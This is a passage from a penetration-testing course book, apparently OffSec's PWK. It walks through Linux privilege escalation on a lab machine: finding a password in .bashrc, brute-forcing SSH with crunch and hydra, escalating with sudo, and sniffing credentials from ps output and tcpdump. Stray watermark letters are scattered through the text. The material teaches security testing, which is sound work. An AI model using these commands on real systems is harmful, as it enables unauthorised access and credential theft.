Usage: unix-privesc-check { standard | detailed }
"standard" mode: Speed-optimised check of lots of security settings.
"detailed" mode: Same as standard mode, but also checks perms of open file
handles and called files (e.g. parsed from shell scripts,
linked .so files). This mode is slow and prone to false
positives but might help you find more subtle flaws in 3rd
party programs.
This script checks file permissions and other settings that could allow
local users to escalate privileges.
... y
Listing 476 - Running unix_privesc_check
As shown in the listing above, the script supports “standard” kand “detailed” mode. Based on the
provided information, the standard mode appears to perform a speed-optimized process and
should provide a reduced number of false positives. Thserefore, in the following example we are
going to transfer the script to the target system and use the standard mode to redirect the entire
output to a file called output.txt.
o
joe@debian-privesc:~$ ./unix-privesc-check standard > output.txt
Listing 477 - Running unix_privesc_check
n
The script performs numerous checks for permissions on common files. For example, the
following excerpt reveals configuration files that are writable by non-root users:
i
z
Checking for writable config files
############################################
Checking if anyone exDcept root can change /etc/passwd
WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
Checking if anyone except root can change /etc/group
Checking if anyone except root can change /etc/fstab
Checking if anyone except root can change /etc/profile
Checking if anyone except root can change /etc/sudoers
Checking if anyone except root can change /etc/shadow
Listing 478 - unix_privesc_check writable configuration files
This output reveals that anyone on the system can edit /etc/passwd. This is quite significant as it
allows attackers to easily elevate their privileges852 or create user accounts on the target. We will
demonstrate this later in the Module.
There are many other tools worth mentioning that are specifically tailored for Linux privilege
escalation information gathering, including LinEnum853 and LinPeas,854 which have been actively
developed and enhanced over recent years.
852 (Raj Chandel, 2018), https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation
853 (Rebootuser. 2022), https://github.com/rebootuser/LinEnum
854 (Polop. 2022), https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 545
Made in Morocco
Penetration Testing with Kali Linux
Although these tools perform many automated checks, we should bear in mind that every system
is different, and unique one-off system changes will often be missed by these types of tools. For
this reason, it’s important to check for unique configurations that can only be caught by manual
inspection, as illustrated in the previous section.
In the next Learning Unit we are going to learn how to act on the information we obtained through
enumeration in order to elevate our privileges.
17.2 Exposed Confidential Information
This Learning Unit covers the following Learning Objectives:
• Understand user history files
• Inspect user trails for credential harvesting
y
• Inspect system trails for credential harvesting
k
In this Learning Unit we are going to inspect how user and service history files constitute the
initial stage of privilege escalation, often leading to the desired outcome.
s
17.2.1 Inspecting User Trails
o
As penetration testers, we are often time-constrained during our engagements. For this reason,
we should focus our efforts first on low-hanging fruit.
n
One such target is users’ history files. These files often hold clear-text user activity that might
include sensitive information such as passwords or other authentication material.
i
On Linux systems, applicatiozns frequently store user-specific configuration files and
subdirectories within a user’s home directory. These files are often called dotfiles855 because they
are prepended with a period. The prepended dot character instructs the system not to display
D
these files when inspecting by basic listing commands.
One example of a dotfile is .bashrc. The .bashrc bash script is executed when a new terminal
window is opened from an existing login session or when a new shell instance is started from an
existing login session. From inside this script, additional environment variables can be specified
to be automatically set whenever a new user’s shell is spawned.
Sometimes system administrators store credentials inside environment variables as a way to
interact with custom scripts that require authentication.
Reviewing our target Debian machine, we’ll notice an unusual environment variable entry:
joe@debian-privesc:~$ env
...
XDG_SESSION_CLASS=user
TERM=xterm-256color
SCRIPT_CREDENTIALS=lab
USER=joe
LC_TERMINAL_VERSION=3.4.16
855 (Arch Linux, 2022), https://wiki.archlinux.org/title/Dotfiles
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 546
Made in Morocco
Penetration Testing with Kali Linux
SHLVL=1
XDG_SESSION_ID=35
LC_CTYPE=UTF-8
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.118.2 59808 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
MAIL=/var/mail/joe
SSH_TTY=/dev/pts/1
OLDPWD=/home/joe/.cache
_=/usr/bin/env
Listing 479 - Inspecting Environment Variables
Interestingly, the SCRIPT_CREDENTIALS variable holds a value that resembles a password. To
confirm that we are dealing with a permanent variable, we need to inspect the .bashrc
configuration file. y
joe@debian-privesc:~$ cat .bashrc
k
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
s
# If not running interactively, don't do anything
case $- in o
*i*) ;;
*) return;;
esac n
# don't put duplicate lines or lines starting with space in the history.
i
# See bash(1) for more options
export SCRIPT_CREDENTIALS="labz"
HISTCONTROL=ignoreboth
...
D
Listing 480 - Inspecting .bashrc
From the above listing, we can confirm that the variable holding the password is exported when a
user’s shell is launched.
Storing a clear-text password inside an environment variable is not considered a
secure best practice. To safely authenticate with an interactive script, it’s
recommended to adopt public key authentication and protect private keys with
passphrases.
Let’s first try to escalate our privileges by directly typing the newly-discovered password.
joe@debian-privesc:~$ su - root
Password:
root@debian-privesc:~# whoami
root
Listing 481 - Becoming ‘root’ user with the leaked credential
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 547
Made in Morocco
Penetration Testing with Kali Linux
Since we’ve successfully obtained root privileges, let’s now try another privilege escalation route
that is instead based on the environment variable credential finding.
Instead of aiming directly for the root account, we could try gaining access to the eve user we
discovered during a previous section.
With our knowledge of script credentials, we could try building a custom dictionary derived from
the known password to attempt brute forcing eve’s account.
We can do this by using the crunch command line tool to generate a custom wordlist. We’ll set
the minimum and maximum length to 6 characters, specify the pattern using the -t parameter,
then hard-code the first three characters to Lab followed by three numeric digits.
kali@kali:~$ crunch 6 6 -t Lab%%% > wordlist
Listing 482 - Generating a wordlist for a bruteforce attack
y
We can then verify the content of the generated wordlist:
k
kali@kali:~$ cat wordlist
Lab000
Lab001 s
Lab002
Lab003
o
Lab004
Lab005
Lab006
n
Lab007
Lab008
Lab009
i
...
z
Listing 483 - Inspecting the Wordlist Content
Since an SSH server is available on our target machine, we can try to attempt a remote brute
D
force attack via Hydra. We’ll supply the target username with the -l parameter, our wordlist with -
P, the target IP address, and finally ssh as the target protocol. We will also include -V to increase
verbosity.
kali@kali:~$ hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military
or secret service organizations, or for illegal purposes (this is non-binding, these
*** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-23 14:30:44
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1000 login tries (l:1/p:1000), ~250
tries per task
[DATA] attacking ssh://192.168.50.214:22/
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab000" - 1 of 1000 [child 0]
(0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab001" - 2 of 1000 [child 1]
(0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab002" - 3 of 1000 [child 2]
(0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab003" - 4 of 1000 [child 3]
(0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab004" - 5 of 1000 [child 2]
(0/0)
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 548
Made in Morocco
Penetration Testing with Kali Linux
...
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab120" - 121 of 1000 [child 0]
(0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab121" - 122 of 1000 [child 3]
(0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab122" - 123 of 1000 [child 2]
(0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab123" - 124 of 1000 [child 1]
(0/0)
[22][ssh] host: 192.168.50.214 login: eve password: Lab123
1 of 1 target successfully completed, 1 valid password found
Listing 484 - Successfully brute-forced eve’s password
Our hydra brute forcing attack succeeded and we can now directly log in to the target machine
with eve’s credentials via SSH: y
kali@kali:~$ ssh PI:EMAIL
PI:EMAIL's password: k
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
...
s
eve@debian-privesc:~$
Listing 485 - Successfully Logged in as eve
o
Once logged in as eve, we can verify if we are running as a privileged user by listing the sudo
capabilities using the sudo -l command.
n
eve@debian-privesc:~$ sudo -l
[sudo] password for eve:
Matching Defaults entries for evie on debian-privesc:
env_reset, mail_badpass, z
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
D
User eve may run the following commands on debian-privesc:
(ALL : ALL) ALL
Listing 486 - Inspecting sudo capabilities
Since eve seems to be an administrative account, we discover it can run any command as an
elevated user. This means we can elevate directly to root by running i with sudo and supplying
eve’s credentials.
eve@debian-privesc:~$ sudo -i
[sudo] password for eve:
root@debian-privesc:/home/eve# whoami
root
Listing 487 - Elevating to root
Great! We managed to elevate our privileges and gain administrative access via another route. In
the next section, we will learn how to escalate privileges by harvesting system services
credentials.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 549
Made in Morocco
Penetration Testing with Kali Linux
17.2.2 Inspecting Service Footprints
System daemons856 are Linux services that are spawned at boot time to perform specific
operations without any need for user interaction. Linux servers are often configured to host
numerous daemons, like SSH, web servers, and databases, to mention a few.
System administrators often rely on custom daemons to execute ad-hoc tasks and they
sometimes neglect security best practices.
As part of our enumeration efforts, we should inspect the behavior of running processes to hunt
for any anomaly that might lead to an elevation of privileges.
Unlike on Windows systems, on Linux we can list information about higher-privilege processes
such as the ones running inside the root user context.
y
We can enumerate all the running processes with the ps command and since it only takes a
single snapshot of the active processes, we can refresh it using the watch command. In the
following example, we will run the ps command every secondk via the watch utility and grep the
results on any occurrence of the word “pass”.
s
joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"
...
o
joe 16867 0.0 0.1 6352 2996 pts/0 S+ 05:41 0:00 watch -n 1 ps -aux |
grep pass
root 16880 0.0 0.0 2384 756 ?n S 05:41 0:00 sh -c sshpass -p
'Lab123' ssh -t eve@127.0.0.1 'sleep 5;exit'
root 16881 0.0 0.0 2356 1640 ? S 05:41 0:00 sshpass -p zzzzzz ssh
i
-t eve@127.0.0.1 sleep 5;exit
... z
Listing 488 - Harvesting Active Processes for Credentials
D
In Listing 488, we notice the administrator has configured a system daemon that is connecting to
the local system with eve’s credentials in clear text. Most importantly, the fact that the process is
running as root does not prevent us from inspecting its activity.
Another more holistic angle we should take into consideration when enumerating for privilege
escalation is to verify whether we have rights to capture network traffic.
tcpdump is the de facto command line standard for packet capture, and it requires administrative
access since it operates on raw sockets. However, it’s not uncommon to find IT personnel
accounts have been given exclusive access to this tool for troubleshooting purposes.
To illustrate the concept, we can run tcpdump as the joe user who has been granted specific sudo
permissions to run it.
tcpdump cannot be run without sudo permissions. That is because it needs to
set up raw sockets857 in order to capture traffic, which is a privileged operation.
856 (Linux man-pages project, 2022), https://man7.org/linux/man-pages/man7/daemon.7.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 550
Made in Morocco
Penetration Testing with Kali Linux
Let’s try to capture traffic in and out of the loopback interface, then dump its content in ASCII
using the -A parameter. Ultimately, we want to filter any traffic containing the “pass” keyword.
joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
[sudo] password for joe:
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...{...zuser:root,pass:lab -
...5...5user:root,pass:lab -